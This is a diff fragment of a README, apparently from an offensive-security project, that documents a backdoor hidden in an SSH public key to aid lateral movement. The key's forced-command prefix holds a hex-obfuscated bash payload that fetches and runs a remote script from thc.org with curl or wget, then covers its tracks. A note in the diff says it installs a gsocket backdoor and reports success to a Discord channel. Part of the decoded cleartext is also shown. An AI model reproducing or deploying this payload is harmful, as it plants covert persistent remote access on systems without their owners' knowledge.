@@ -8,10 +8,11 @@ The objective is to use the ssh public key to move laterally within a target net
 $ ./ssh-key-backdoor.sh
 ```
 
-The *public* key is then changed to:
+The output is prepended to the *public* `id_rsa.pub` to look like this:
 ```shell
 command="`###---AUTH-DO-NOT-REMOVE---`;bash -c '{ eval $(echo 5b5b20242873746174202d632559202f62696e2f73682920213d20242873746174202d632559202e73736829205d5d202626207b203a3b746f756368202d72202f62696e2f7368202e7373683b6578706f7274204b45593d22223b62617368202d63202224286375726c202d6673534c207468632e6f72672f737368782922207c7c2062617368202d632022242877676574202d2d6e6f2d766572626f7365202d4f2d207468632e6f72672f737368782922207c7c206578697420303b7d203e2f6465762f6e756c6c20323e2f6465762f6e756c6c2026203a3b5b5b202d6e20245353485f4f524947494e414c5f434f4d4d414e44205d5d202626206578656320245353485f4f524947494e414c5f434f4d4d414e443b5b5b202d7a20245348454c4c205d5d202626205348454c4c3d2f62696e2f626173683b5b5b202d66202f72756e2f6d6f74642e64796e616d6963205d5d20262620636174202f72756e2f6d6f74642e64796e616d69633b5b5b202d66202f6574632f6d6f7464205d5d20262620636174202f6574632f6d6f74643b65786563202d61202d2428626173656e616d6520245348454c4c2920245348454c4c3b0a|xxd -r -ps);}'" ssh-ed25519 AAAAC3Nzablahblshblah.... x@y
 ```
+> The DEMO script installs https://www.gsocket.io/deploy backdoor and reports the success to our Discord channel.
 
 This goes deep down the Bash rabbit hole...the curious reader may like to look at the cleartext:
 ```shell
@@ -28,5 +29,4 @@ command="`###---AUTH-DO-NOT-REMOVE---`;bash -c '{
   [[ -f /etc/motd ]] && cat /etc/motd
   exec -a -$(basename $SHELL) $SHELL;}'"
 ```
-and one day I shall 
-There is some great bash 
+
